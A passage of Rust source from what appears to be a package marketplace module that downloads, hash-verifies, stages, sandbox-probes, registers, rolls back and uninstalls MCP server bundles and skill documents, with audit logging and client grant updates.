                    .split([' ', '<', '>', '=', '!', '~', '['])
                    .next()
                    .unwrap_or("")
                    .trim();
                if !dep_name.is_empty() && validate_pypi_pkg_name(dep_name).is_ok() {
                    let dn = dep_name.to_ascii_lowercase().replace(['_', '.'], "-");
                    if !seen.contains(&dn) {
                        queue.push_back((dep_name.to_owned(), None));
                    }
                }
            }
        }
    }

    let site_path = staging_path.join("site-packages");
    let preferred = req
        .entrypoint
        .as_deref()
        .or_else(|| recipe.map(|r| r.entrypoint));
    let (module, func) = find_console_script(&site_path, preferred)?;
    if !module
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.'))
        || !func.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
    {
        return Err("Unsafe console_scripts identifier in wheel".into());
    }
    let boot = format!(
        "import sys\nsys.path.insert(0, '/upstream/bundle/site-packages')\nfrom {module} import {func}\nsys.exit({func}() or 0)\n"
    );
    write_regular_beneath(
        staging_fd,
        Path::new("entrypoint.py"),
        boot.as_bytes(),
        false,
    )?;

    let mut args = vec!["/upstream/bundle/entrypoint.py".to_owned()];
    if let Some(extra) = &req.args {
        args.extend(extra.iter().cloned());
    }

    Ok(PreparedBundle {
        id: id.to_owned(),
        kind: ProviderKind::Pypi,
        version: resolved_version,
        source_url: primary_url,
        digest: primary_digest,
        command: "/usr/bin/python3".to_owned(),
        args,
        tool_families: None,
        provenance: recipe.and_then(|r| r.attestation.map(str::to_owned)),
        is_skill: false,
        skill_name: None,
        skill_document: None,
    })
}

#[allow(clippy::too_many_arguments)]
fn stage_binary(
    id: &str,
    version: &str,
    recipe: Option<&VerifiedRecipe>,
    req: &InstallRequest,
    state_root: &Path,
    staging_fd: &OwnedFd,
    manager: Option<&MarketplaceManager>,
    op_id: &str,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<PreparedBundle, String> {
    let url = req
        .url
        .as_deref()
        .or_else(|| recipe.map(|r| r.url))
        .ok_or("Standalone binary install requires an explicit HTTPS/loopback URL")?;
    let pin256 = req
        .sha256
        .as_deref()
        .or_else(|| recipe.and_then(|r| r.sha256))
        .ok_or("Standalone binary install requires a mandatory expected sha256 pin")?;
    let member_target = req
        .binary_member
        .as_deref()
        .or_else(|| recipe.and_then(|r| r.member));

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "downloading",
            format!("Downloading binary artifact for {id}"),
            None,
        );
    }
    let raw = fetch_bytes(
        url,
        MAX_DOWNLOAD_BYTES,
        cancelled,
        child_pid,
        bytes_counter,
        total_counter,
    )?;
    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "verifying",
            format!("Verifying SHA-256 of {id}"),
            None,
        );
    }
    let digest = verify_sha256_hex(&raw, pin256)?;

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "staging",
            format!("Extracting verified ELF binary for {id}"),
            None,
        );
    }
    let elf_bytes = if raw.starts_with(b"\x7fELF") {
        raw
    } else if raw.len() >= 2 && raw[0] == 0x1f && raw[1] == 0x8b {
        let tar = gunzip_bounded(&raw)?;
        let mut found: Option<Vec<u8>> = None;
        iterate_tar(&tar, |name, typeflag, data| {
            if !matches!(typeflag, b'0' | 0 | b'5') {
                return Err(format!(
                    "Unsafe link or special file in binary archive: {name}"
                ));
            }
            if matches!(typeflag, b'0' | 0) {
                let rel = validate_rel_path(name, None)?.ok_or("Empty binary member path")?;
                let matches_target = match member_target {
                    Some(t) => {
                        rel == Path::new(t) || rel.file_name().and_then(OsStr::to_str) == Some(t)
                    }
                    None => {
                        rel.file_name().and_then(OsStr::to_str) == Some(id)
                            || data.starts_with(b"\x7fELF")
                    }
                };
                if matches_target {
                    if data.len() > MAX_SINGLE_FILE_BYTES {
                        return Err("Binary exceeds 50 MiB limit".into());
                    }
                    if found.replace(data.to_vec()).is_some() {
                        return Err("Ambiguous multiple executables in archive".into());
                    }
                }
            }
            Ok(())
        })?;
        found.ok_or("Expected executable member missing from binary archive")?
    } else {
        return Err("Standalone binary must be a verified ELF or .tar.gz release archive".into());
    };

    if !elf_bytes.starts_with(b"\x7fELF") {
        return Err("Extracted binary failed ELF magic header verification".into());
    }
    let bin_name = member_target
        .and_then(|s| Path::new(s).file_name().and_then(OsStr::to_str))
        .filter(|s| !s.is_empty() && !s.contains('/'))
        .unwrap_or(id);
    let rel_bin = Path::new("bin").join(bin_name);
    write_regular_beneath(staging_fd, &rel_bin, &elf_bytes, true)?;

    let final_bin_path = state_root
        .join("upstream-bundles")
        .join(id)
        .join("bin")
        .join(bin_name);
    let default_args = if id == "rust-anything" && req.args.is_none() {
        vec!["mcp".to_owned()]
    } else {
        req.args.clone().unwrap_or_default()
    };

    Ok(PreparedBundle {
        id: id.to_owned(),
        kind: ProviderKind::Binary,
        version: version.to_owned(),
        source_url: url.to_owned(),
        digest,
        command: final_bin_path.display().to_string(),
        args: default_args,
        tool_families: None,
        provenance: recipe.and_then(|r| r.attestation.map(str::to_owned)),
        is_skill: false,
        skill_name: None,
        skill_document: None,
    })
}

#[allow(clippy::too_many_arguments)]
fn stage_skill(
    id: &str,
    version: &str,
    recipe: Option<&VerifiedRecipe>,
    req: &InstallRequest,
    catalog_entry: Option<&Value>,
    manager: Option<&MarketplaceManager>,
    op_id: &str,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<PreparedBundle, String> {
    let url = req
        .url
        .as_deref()
        .or_else(|| recipe.map(|r| r.url))
        .or_else(|| {
            if let Some(entry) = catalog_entry
                && let Some(src) = entry["installation"]["source"].as_str()
                && src.starts_with("https://github.com/anthropics/skills/tree/")
            {
                return Some("https://codeload.github.com/anthropics/skills/tar.gz/1780c5e5a552fd4d1c9d6a7b0cab26b0c2bef064");
            }
            None
        })
        .ok_or("Skill installation requires a pinned archive or SKILL.md URL")?;

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "downloading",
            format!("Downloading skill package {id}"),
            None,
        );
    }
    let raw = fetch_bytes(
        url,
        MAX_DOWNLOAD_BYTES,
        cancelled,
        child_pid,
        bytes_counter,
        total_counter,
    )?;

    let digest = if let Some(pin) = req
        .sha256
        .as_deref()
        .or_else(|| recipe.and_then(|r| r.sha256))
    {
        verify_sha256_hex(&raw, pin)?
    } else {
        format!("sha256:{:x}", Sha256::digest(&raw))
    };

    let skill_name = req
        .entrypoint
        .clone()
        .or_else(|| recipe.map(|r| r.entrypoint.to_owned()))
        .unwrap_or_else(|| id.strip_prefix("skill-").unwrap_or(id).to_owned());
    if !crate::skills::valid_name(&skill_name) {
        return Err("Invalid destination skill name".into());
    }

    let document = if raw.len() >= 2 && raw[0] == 0x1f && raw[1] == 0x8b {
        let tar = gunzip_bounded(&raw)?;
        let expected_suffix = req
            .binary_member
            .as_deref()
            .or_else(|| recipe.and_then(|r| r.member))
            .map(str::to_owned)
            .unwrap_or_else(|| format!("skills/{skill_name}/SKILL.md"));
        let mut found: Option<String> = None;
        iterate_tar(&tar, |name, typeflag, data| {
            if !matches!(typeflag, b'0' | 0 | b'5') {
                return Err(format!("Unsafe link in skill archive: {name}"));
            }
            if matches!(typeflag, b'0' | 0)
                && let Some(rel) = validate_rel_path(name, None)?
            {
                let rel_str = rel.display().to_string();
                if rel_str == expected_suffix
                    || rel_str.ends_with(&format!("/{expected_suffix}"))
                    || rel_str == "SKILL.md"
                {
                    if data.len() > 256 * 1024 {
                        return Err("SKILL.md exceeds 256 KiB bound".into());
                    }
                    let txt = std::str::from_utf8(data)
                        .map_err(|_| "SKILL.md must be valid UTF-8")?
                        .to_owned();
                    found = Some(txt);
                }
            }
            Ok(())
        })?;
        found.ok_or("SKILL.md not found in pinned skill archive")?
    } else {
        if raw.len() > 256 * 1024 {
            return Err("SKILL.md exceeds 256 KiB bound".into());
        }
        std::str::from_utf8(&raw)
            .map_err(|_| "SKILL.md must be valid UTF-8")?
            .to_owned()
    };

    let parsed = Skill::parse(&skill_name, document).map_err(|e| format!("Invalid skill: {e}"))?;

    Ok(PreparedBundle {
        id: id.to_owned(),
        kind: ProviderKind::Skill,
        version: version.to_owned(),
        source_url: url.to_owned(),
        digest,
        command: String::new(),
        args: Vec::new(),
        tool_families: None,
        provenance: Some("guidance-only SKILL.md verified without executing scripts".into()),
        is_skill: true,
        skill_name: Some(skill_name),
        skill_document: Some(parsed.document),
    })
}

fn remove_dir_tree_safe(path: &Path) {
    let _ = fs::remove_dir_all(path);
}

#[allow(clippy::too_many_arguments)]
fn execute_install(
    config: &Path,
    op_id: &str,
    req: &InstallRequest,
    manager: Option<&MarketplaceManager>,
    cancelled: &AtomicBool,
    child_pid: &AtomicI32,
    bytes_counter: &AtomicU64,
    total_counter: &AtomicU64,
) -> Result<Value, String> {
    if rustix::process::geteuid().is_root() {
        return Err("Use the local unprivileged operator identity".into());
    }
    let id = resolve_target_id(req)?;
    let recipe = RECIPES.iter().find(|r| r.id == req.id || r.id == id);
    let catalog_entry = lookup_catalog(&req.id)?.or(lookup_catalog(&id)?);
    let (kind, pkg_opt, version, _) =
        parse_req_kind_and_package(req, catalog_entry.as_ref(), recipe)?;

    let state_root = state_root_of(config)?;
    let bundles_root = ensure_private_dir(&state_root, "upstream-bundles")?;
    let staging_root = ensure_private_dir(&state_root, "upstream-staging")?;
    let installs_root = ensure_private_dir(&state_root, "upstream-installs")?;

    let stage_dir = ensure_private_dir(&staging_root, op_id)?;
    struct StageCleanup(PathBuf);
    impl Drop for StageCleanup {
        fn drop(&mut self) {
            remove_dir_tree_safe(&self.0);
        }
    }
    let _stage_guard = StageCleanup(stage_dir.clone());

    let stage_fd =
        open_absolute_dir(&stage_dir).map_err(|_| "Cannot open private staging directory")?;

    let prepared = match kind {
        ProviderKind::Npm => {
            let pkg = pkg_opt.ok_or("Missing npm package name")?;
            stage_npm(
                &id,
                &pkg,
                &version,
                recipe,
                req,
                &stage_dir,
                &stage_fd,
                manager,
                op_id,
                cancelled,
                child_pid,
                bytes_counter,
                total_counter,
            )?
        }
        ProviderKind::Pypi => {
            let pkg = pkg_opt.ok_or("Missing PyPI package name")?;
            stage_pypi(
                &id,
                &pkg,
                &version,
                recipe,
                req,
                &stage_dir,
                &stage_fd,
                manager,
                op_id,
                cancelled,
                child_pid,
                bytes_counter,
                total_counter,
            )?
        }
        ProviderKind::Binary => stage_binary(
            &id,
            &version,
            recipe,
            req,
            &state_root,
            &stage_fd,
            manager,
            op_id,
            cancelled,
            child_pid,
            bytes_counter,
            total_counter,
        )?,
        ProviderKind::Skill => stage_skill(
            &id,
            &version,
            recipe,
            req,
            catalog_entry.as_ref(),
            manager,
            op_id,
            cancelled,
            child_pid,
            bytes_counter,
            total_counter,
        )?,
    };

    if cancelled.load(Ordering::Relaxed) {
        return Err("Operation cancelled".into());
    }

    if prepared.is_skill {
        return commit_skill_install(config, &installs_root, op_id, &prepared);
    }

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "registering",
            format!("Registering {id} atomically"),
            Some(90),
        );
    }

    let bundle_dst = bundles_root.join(&id);
    let backup_dst = bundles_root.join(format!(".backup-{id}"));
    if backup_dst.exists() {
        return Err("Interrupted backup exists; run `veyl marketplace recover` first".into());
    }
    let receipt_path = installs_root.join(format!("{id}.json"));
    let prev_receipt = fs::read(&receipt_path)
        .ok()
        .and_then(|b| serde_json::from_slice::<InstallReceipt>(&b).ok());

    let (prev_server, had_previous_bundle) = {
        let policy = PolicyFile::lock(config, true)?;
        let bytes = policy.bytes()?;
        let settings = parse_clients(config, &bytes)?;
        verify_approvals(&settings)?;
        let ledger = settings
            .audit_log
            .as_deref()
            .ok_or("Marketplace install requires audit logging")?;
        let audit = AuditSink::open_with_limits(ledger, settings.audit_limits)
            .map_err(|_| "Marketplace install requires a healthy audit ledger")?;

        let mut document = parse_document(&bytes)?;
        if document.get("mcp_servers").is_none() {
            document["mcp_servers"] = json!({});
        }
        let servers = document["mcp_servers"]
            .as_object_mut()
            .ok_or("Invalid mcp_servers configuration")?;
        let existing_server = servers.get(&id).cloned();
        if existing_server.is_some() && !req.update && prev_receipt.is_none() {
            return Err("Server ID already configured; use update or choose a different ID".into());
        }
        let had_prev_bundle = bundle_dst.exists();
        let journal = CrashJournal {
            op_id: op_id.to_owned(),
            id: id.clone(),
            kind: prepared.kind.as_str().to_owned(),
            phase: "swapping".into(),
            is_skill: false,
            skill_name: None,
            had_previous_bundle: had_prev_bundle,
            previous_server: existing_server.clone(),
            previous_receipt: prev_receipt.clone(),
            started_at: now_secs(),
        };
        write_private_json(
            &installs_root,
            &format!(".journal-{op_id}.json"),
            &serde_json::to_value(&journal).map_err(|_| "Journal encode error")?,
        )?;

        if had_prev_bundle {
            fs::rename(&bundle_dst, &backup_dst)
                .map_err(|_| "Failed preparing backup of existing bundle")?;
        }
        if let Err(e) = fs::rename(&stage_dir, &bundle_dst) {
            if had_prev_bundle {
                let _ = fs::rename(&backup_dst, &bundle_dst);
            }
            let _ = fs::remove_file(installs_root.join(format!(".journal-{op_id}.json")));
            return Err(format!(
                "Failed moving staged bundle into upstream-bundles: {e}"
            ));
        }

        let server_entry = json!({
            "transport": "stdio",
            "command": prepared.command,
            "args": prepared.args,
            "enabled": true,
            "runtime_bundle": true,
        });
        servers.insert(id.clone(), server_entry);

        let marker = format!("marketplace:install:{id}:{op_id}");
        if let Err(err) = policy.commit_edit(&document, &marker, |phase| {
            audit.record_upstream_change("marketplace_install", &id, None, None, phase, now_secs())
        }) {
            remove_dir_tree_safe(&bundle_dst);
            if had_prev_bundle {
                let _ = fs::rename(&backup_dst, &bundle_dst);
            }
            let _ = fs::remove_file(installs_root.join(format!(".journal-{op_id}.json")));
            return Err(err);
        }
        (existing_server, had_prev_bundle)
    };

    if cancelled.load(Ordering::Relaxed) {
        rollback_failed_swap(
            config,
            &id,
            &bundle_dst,
            &backup_dst,
            had_previous_bundle,
            prev_server,
            prev_receipt,
            &installs_root,
            op_id,
        );
        return Err("Operation cancelled during finalization; rolled back cleanly".into());
    }

    if let Some(m) = manager {
        m.set_phase(
            op_id,
            "probing",
            format!("Probing {id} inside Bubblewrap"),
            Some(95),
        );
    }
    let probe = {
        let policy = PolicyFile::lock(config, false)?;
        let bytes = policy.bytes()?;
        let settings = parse_clients(config, &bytes)?;
        settings.upstreams.probe(config, &id)
    };

    let healthy = probe
        .as_ref()
        .is_ok_and(|p| p["health"].as_str() == Some("ready"));
    if !healthy {
        rollback_failed_swap(
            config,
            &id,
            &bundle_dst,
            &backup_dst,
            had_previous_bundle,
            prev_server,
            prev_receipt,
            &installs_root,
            op_id,
        );
        let detail = match probe {
            Ok(p) => format!(
                "Provider health check returned '{}'",
                p["health"].as_str().unwrap_or("unavailable")
            ),
            Err(e) => format!("Provider health probe error: {e}"),
        };
        return Err(format!("{detail}; automatically rolled back"));
    }

    let receipt = InstallReceipt {
        id: id.clone(),
        kind: prepared.kind.as_str().to_owned(),
        version: prepared.version.clone(),
        source_url: prepared.source_url.clone(),
        digest: prepared.digest.clone(),
        installed_at: now_secs(),
        enabled: true,
        tool_families: prepared.tool_families.clone(),
        command: prepared.command.clone(),
        args: prepared.args.clone(),
        skill_name: None,
        provenance: prepared.provenance.clone(),
    };
    write_private_json(
        &installs_root,
        &format!("{id}.json"),
        &serde_json::to_value(&receipt).map_err(|_| "Receipt encode error")?,
    )?;
    if backup_dst.exists() {
        remove_dir_tree_safe(&backup_dst);
    }
    let _ = fs::remove_file(installs_root.join(format!(".journal-{op_id}.json")));

    Ok(json!({
        "id": id,
        "installed": true,
        "version": prepared.version,
        "digest": prepared.digest,
        "probe": probe.unwrap_or_else(|_| json!({"health":"ready"})),
        "message": format!("Installed and verified {id} ({})", prepared.version),
    }))
}

#[allow(clippy::too_many_arguments)]
fn rollback_failed_swap(
    config: &Path,
    id: &str,
    bundle_dst: &Path,
    backup_dst: &Path,
    had_prev_bundle: bool,
    prev_server: Option<Value>,
    prev_receipt: Option<InstallReceipt>,
    installs_root: &Path,
    op_id: &str,
) {
    if let Ok(policy) = PolicyFile::lock(config, true)
        && let Ok(bytes) = policy.bytes()
        && let Ok(settings) = parse_clients(config, &bytes)
        && let Ok(mut document) = parse_document(&bytes)
    {
        if let Some(servers) = document
            .get_mut("mcp_servers")
            .and_then(Value::as_object_mut)
        {
            match prev_server {
                Some(prev) => {
                    servers.insert(id.to_owned(), prev);
                }
                None => {
                    servers.remove(id);
                    if let Some(clients) = document["clients"].as_array_mut() {
                        for c in clients {
                            if let Some(arr) =
                                c.get_mut("allowed_servers").and_then(Value::as_array_mut)
                            {
                                arr.retain(|x| x.as_str() != Some(id));
                            }
                            if let Some(obj) = c
                                .get_mut("allowed_server_tools")
                                .and_then(Value::as_object_mut)
                            {
                                obj.remove(id);
                            }
                            if let Some(obj) = c
                                .get_mut("upstream_workspace_roots")
                                .and_then(Value::as_object_mut)
                            {
                                obj.remove(id);
                            }
                        }
                    }
                }
            }
        }
        let audit = settings
            .audit_log
            .as_deref()
            .and_then(|l| AuditSink::open_with_limits(l, settings.audit_limits).ok());
        let marker = format!("marketplace:rollback:{id}:{op_id}");
        let _ = policy.commit_edit(&document, &marker, |phase| {
            if let Some(ref sink) = audit {
                let _ = sink.record_upstream_change(
                    "marketplace_rollback",
                    id,
                    None,
                    None,
                    phase,
                    now_secs(),
                );
            }
            Ok(())
        });
    }
    remove_dir_tree_safe(bundle_dst);
    if had_prev_bundle && backup_dst.exists() {
        let _ = fs::rename(backup_dst, bundle_dst);
    }
    let receipt_path = installs_root.join(format!("{id}.json"));
    if let Some(prev) = prev_receipt {
        let _ = write_private_json(
            installs_root,
            &format!("{id}.json"),
            &serde_json::to_value(prev).unwrap_or(Value::Null),
        );
    } else {
        let _ = fs::remove_file(receipt_path);
    }
    let _ = fs::remove_file(installs_root.join(format!(".journal-{op_id}.json")));
}

fn commit_skill_install(
    config: &Path,
    installs_root: &Path,
    op_id: &str,
    prepared: &PreparedBundle,
) -> Result<Value, String> {
    let skill_name = prepared
        .skill_name
        .as_deref()
        .ok_or("Missing skill target name")?;
    let document_text = prepared
        .skill_document
        .as_deref()
        .ok_or("Missing skill document")?;
    let policy = PolicyFile::lock(config, true)?;
    let bytes = policy.bytes()?;
    let settings = parse_clients(config, &bytes)?;
    verify_approvals(&settings)?;
    let skills = settings
        .skills
        .as_ref()
        .ok_or("Skills store (skills_dir) is not configured in clients.json")?;
    let ledger = settings
        .audit_log
        .as_deref()
        .ok_or("Skill installation requires audit logging")?;
    let audit = AuditSink::open_with_limits(ledger, settings.audit_limits)
        .map_err(|_| "Skill installation requires a healthy audit ledger")?;
    audit
        .record_skill_change(
            "marketplace_install",
            skill_name,
            AuditPhase::Intent,
            now_secs(),
        )
        .map_err(|_| "Cannot audit skill install intent")?;
    skills
        .upsert(skill_name, document_text)
        .map_err(|_| "Failed publishing validated SKILL.md into skills_dir")?;
    audit
        .record_skill_change(
            "marketplace_install",
            skill_name,
            AuditPhase::Success,
            now_secs(),
        )
        .map_err(|_| "Cannot audit skill install outcome")?;
    let receipt = InstallReceipt {
        id: prepared.id.clone(),
        kind: "skill".into(),
        version: prepared.version.clone(),
        source_url: prepared.source_url.clone(),
        digest: prepared.digest.clone(),
        installed_at: now_secs(),
        enabled: true,
        tool_families: None,
        command: String::new(),
        args: Vec::new(),
        skill_name: Some(skill_name.to_owned()),
        provenance: prepared.provenance.clone(),
    };
    write_private_json(
        installs_root,
        &format!("{}.json", prepared.id),
        &serde_json::to_value(&receipt).map_err(|_| "Receipt encode error")?,
    )?;
    let _ = op_id;
    Ok(json!({
        "id": prepared.id,
        "installed": true,
        "skill": skill_name,
        "version": prepared.version,
        "digest": prepared.digest,
        "message": format!("Installed validated skill {skill_name}"),
    }))
}

pub(crate) fn configure(
    config: &Path,
    id: &str,
    families: Option<&str>,
    enabled: Option<bool>,
) -> Result<Value, String> {
    let target_id = server_id_from_catalog(id)?;
    let state_root = state_root_of(config)?;
    let installs_root = state_root.join("upstream-installs");
    let receipt_path = installs_root.join(format!("{target_id}.json"));
    let receipt_raw =
        fs::read(&receipt_path).map_err(|_| "Provider is not managed by marketplace receipts")?;
    let mut receipt: InstallReceipt =
        serde_json::from_slice(&receipt_raw).map_err(|_| "Corrupt provider receipt")?;

    let policy = PolicyFile::lock(config, true)?;
    let bytes = policy.bytes()?;
    let settings = parse_clients(config, &bytes)?;
    verify_approvals(&settings)?;
    let ledger = settings
        .audit_log
        .as_deref()
        .ok_or("Configure requires audit logging")?;
    let audit = AuditSink::open_with_limits(ledger, settings.audit_limits)
        .map_err(|_| "Configure requires a healthy audit ledger")?;
    let mut document = parse_document(&bytes)?;
    let server = document
        .get_mut("mcp_servers")
        .and_then(Value::as_object_mut)
        .and_then(|s| s.get_mut(&target_id))
        .ok_or("Provider is not registered in mcp_servers")?;

    if let Some(fam_raw) = families {
        if target_id != "rea" {
            return Err("Tool families configuration applies to REA".into());
        }
        let validated = validate_rea_families(fam_raw)?;
        let new_args = vec![
            format!("REA_MCP_TOOL_FAMILIES={validated}"),
            "/usr/bin/node".to_owned(),
            "/upstream/bundle/scripts/rea.mjs".to_owned(),
            "mcp".to_owned(),
        ];
        server["args"] = json!(new_args);
        receipt.tool_families = Some(validated);
        receipt.args = new_args;
    }
    if let Some(flag) = enabled {
        server["enabled"] = json!(flag);
        receipt.enabled = flag;
    }
    let marker = format!("marketplace:configure:{target_id}");
    policy.commit_edit(&document, &marker, |phase| {
        audit.record_upstream_change(
            "marketplace_configure",
            &target_id,
            None,
            None,
            phase,
            now_secs(),
        )
    })?;
    write_private_json(
        &installs_root,
        &format!("{target_id}.json"),
        &serde_json::to_value(&receipt).map_err(|_| "Receipt encode error")?,
    )?;
    drop(policy);
    let refreshed = parse_clients(
        config,
        &fs::read(config).map_err(|_| "Cannot reread config")?,
    )?;
    let probe = refreshed.upstreams.probe(config, &target_id)?;
    Ok(json!({
        "id": target_id,
        "configured": true,
        "receipt": receipt,
        "probe": probe,
    }))
}

pub(crate) fn uninstall(config: &Path, raw_id: &str) -> Result<Value, String> {
    let target_id = if server_name(raw_id) {
        raw_id.to_owned()
    } else {
        server_id_from_catalog(raw_id)?
    };
    let state_root = state_root_of(config)?;
    let installs_root = state_root.join("upstream-installs");
    let receipt_path = installs_root.join(format!("{target_id}.json"));
    let receipt = fs::read(&receipt_path)
        .ok()
        .and_then(|b| serde_json::from_slice::<InstallReceipt>(&b).ok());

    let policy = PolicyFile::lock(config, true)?;
    let bytes = policy.bytes()?;
    let settings = parse_clients(config, &bytes)?;
    verify_approvals(&settings)?;
    let ledger = settings
        .audit_log
        .as_deref()
        .ok_or("Uninstall requires audit logging")?;
    let audit = AuditSink::open_with_limits(ledger, settings.audit_limits)
        .map_err(|_| "Uninstall requires a healthy audit ledger")?;

    if let Some(ref r) = receipt
        && r.kind == "skill"
    {
        if let Some(skills) = &settings.skills
            && let Some(skill_name) = &r.skill_name
        {
            audit
                .record_skill_change(
                    "marketplace_uninstall",
                    skill_name,
                    AuditPhase::Intent,
                    now_secs(),
                )
                .map_err(|_| "Cannot audit skill uninstall")?;
            let _ = skills.remove(skill_name);
            audit
                .record_skill_change(
                    "marketplace_uninstall",
                    skill_name,
                    AuditPhase::Success,
                    now_secs(),
                )
                .map_err(|_| "Cannot audit skill uninstall outcome")?;
        }
        let _ = fs::remove_file(&receipt_path);
        return Ok(json!({"id": target_id, "uninstalled": true}));
    }

    let mut document = parse_document(&bytes)?;
    if let Some(servers) = document
        .get_mut("mcp_servers")
        .and_then(Value::as_object_mut)
    {
        servers.remove(&target_id);
    }
    if let Some(clients) = document["clients"].as_array_mut() {
        for client in clients {
            if let Some(grants) = client
                .get_mut("allowed_servers")
                .and_then(Value::as_array_mut)
            {
                grants.retain(|g| g.as_str() != Some(&target_id));
            }
            if let Some(grants) = client
                .get_mut("allowed_server_tools")
                .and_then(Value::as_object_mut)
            {
                grants.remove(&target_id);
            }
            if let Some(grants) = client
                .get_mut("upstream_workspace_roots")
                .and_then(Value::as_object_mut)
            {
                grants.remove(&target_id);
            }
        }
    }
    let marker = format!("marketplace:uninstall:{target_id}");
    policy.commit_edit(&document, &marker, |phase| {
        audit.record_upstream_change(
            "marketplace_uninstall",
            &target_id,
            None,
            None,
            phase,
            now_secs(),
        )
    })?;
    remove_dir_tree_safe(&state_root.join("upstream-bundles").join(&target_id));
    remove_dir_tree_safe(
        &state_root
            .join("upstream-bundles")
            .join(format!(".backup-{target_id}")),
    );
    let _ = fs::remove_file(&receipt_path);
    Ok(json!({"id": target_id, "uninstalled": true}))
}

pub(crate) fn update_client_grants(config: &Path, body: &Value) -> Result<Value, String> {
    let client_id = body["client"].as_str().ok_or("Missing client id")?;
    let policy = PolicyFile::lock(config, true)?;
    let bytes = policy.bytes()?;
    let settings = parse_clients(config, &bytes)?;
    verify_approvals(&settings)?;
    let ledger = settings
        .audit_log
        .as_deref()
        .ok_or("Client grant updates require audit logging")?;
    let audit = AuditSink::open_with_limits(ledger, settings.audit_limits)
        .map_err(|_| "Client grant updates require a healthy audit ledger")?;

    let mut document = parse_document(&bytes)?;
    let configured_servers: BTreeSet<String> = document
        .get("mcp_servers")
        .and_then(Value::as_object)
        .map(|m| m.keys().cloned().collect())
        .unwrap_or_default();

    let entry = document["clients"]
        .as_array_mut()
        .and_then(|arr| arr.iter_mut().find(|c| c["id"].as_str() == Some(client_id)))
        .ok_or("Unknown client")?;

    if let Some(tools_arr) = body.get("tools") {
        let list = tools_arr.as_array().ok_or("tools must be an array")?;
        let mut clean = BTreeSet::new();
        for item in list {
            let name = item.as_str().ok_or("Invalid tool name")?;
            if Tool::parse(name).is_none() {
                return Err(format!("Unsupported native tool: {name}"));
            }
            clean.insert(name.to_owned());
        }
        entry["tools"] = json!(clean.into_iter().collect::<Vec<_>>());
    }
    if let Some(servers_arr) = body.get("allowed_servers") {
        let list = servers_arr
            .as_array()
            .ok_or("allowed_servers must be an array")?;
        let mut clean = BTreeSet::new();
        for item in list {
            let sid = item.as_str().ok_or("Invalid server id")?;
            if !configured_servers.contains(sid) {
                return Err(format!("Unknown upstream server: {sid}"));
            }
            clean.insert(sid.to_owned());
        }
        entry["allowed_servers"] = json!(clean.into_iter().collect::<Vec<_>>());
    }
    if let Some(tools_obj) = body.get("allowed_server_tools") {
        let map = tools_obj
            .as_object()
            .ok_or("allowed_server_tools must be an object")?;
        let mut clean_map: BTreeMap<String, Vec<String>> = BTreeMap::new();
        for (sid, raw_list) in map {
            if !configured_servers.contains(sid) {
                return Err(format!(
                    "Unknown upstream server in allowed_server_tools: {sid}"
                ));
            }
            let arr = raw_list
                .as_array()
                .ok_or("Expected array of tool names in allowed_server_tools")?;
            let mut tnames = BTreeSet::new();
            for t in arr {
                let tn = t.as_str().ok_or("Invalid upstream tool name")?;
                if !super::tool_name(tn) {
                    return Err(format!("Invalid upstream tool name: {tn}"));
                }
                tnames.insert(tn.to_owned());
            }
            clean_map.insert(sid.clone(), tnames.into_iter().collect());
        }
        // Automatically align allowed_servers when allowed_server_tools specifies active servers
        if body.get("allowed_servers").is_none() {
            let mut active: BTreeSet<String> = entry
                .get("allowed_servers")
                .and_then(Value::as_array)
                .map(|a| {
                    a.iter()
                        .filter_map(Value::as_str)
                        .filter(|s| configured_servers.contains(*s))
                        .map(str::to_owned)
                        .collect()
                })
                .unwrap_or_default();
            for (sid, tools) in &clean_map {
                if !tools.is_empty() {
                    active.insert(sid.clone());
                } else {
                    active.remove(sid);
                }
            }
            entry["allowed_servers"] = json!(active.into_iter().collect::<Vec<_>>());
        }
        entry["allowed_server_tools"] = json!(clean_map);
    }

    // Removing an upstream server grant must also remove its workspace delegation.
    let active: BTreeSet<String> = entry["allowed_servers"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .map(str::to_owned)
        .collect();
    if let Some(roots) = entry
        .get_mut("upstream_workspace_roots")
        .and_then(Value::as_object_mut)
    {
        roots.retain(|id, _| active.contains(id));
    }
    let marker = format!("grants:{client_id}");
    policy.commit_edit(&document, &marker, |phase| {
        audit.record_upstream_change(
            "client_grants",
            "",
            Some(client_id),
            None,
            phase,
            now_secs(),
        )
    })?;
    Ok(json!({"client": client_id, "updated": true}))
}

fn reconcile_interrupted_inactive(
    config: &Path,
    active: &BTreeSet<String>,
) -> Result<Vec<String>, String> {
    let state_root = state_root_of(config)?;
    let installs_root = state_root.join("upstream-installs");
    let bundles_root = state_root.join("upstream-bundles");
    let staging_root = state_root.join("upstream-staging");
    let mut recovered = Vec::new();

    if installs_root.is_dir()
        && let Ok(entries) = fs::read_dir(&installs_root)
    {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let Some(name_str) = name.to_str() else {
                continue;
            };
            if !name_str.starts_with(".journal-") || !name_str.ends_with(".json") {
                continue;
            }
            let Ok(raw) = fs::read(entry.path()) else {
                continue;
            };
            let Ok(journal) = serde_json::from_slice::<CrashJournal>(&raw) else {
                let _ = fs::remove_file(entry.path());
                continue;
            };
            if active.contains(&journal.op_id) {
                continue;
            }
            rollback_failed_swap(
                config,
                &journal.id,
                &bundles_root.join(&journal.id),
                &bundles_root.join(format!(".backup-{}", journal.id)),
                journal.had_previous_bundle,
                journal.previous_server,
                journal.previous_receipt,
                &installs_root,
                &journal.op_id,
            );
            recovered.push(journal.id);
        }
    }
    if staging_root.is_dir()
        && let Ok(entries) = fs::read_dir(&staging_root)
    {
        for entry in entries.flatten() {
            let name = entry.file_name();
            let Some(name_str) = name.to_str() else {
                continue;
            };
            if !active.contains(name_str) {
                remove_dir_tree_safe(&entry.path());
            }
        }
    }
    Ok(recovered)
}

pub(crate) fn run(args: &[OsString]) -> Result<(), String> {
    if args == ["--help"] {
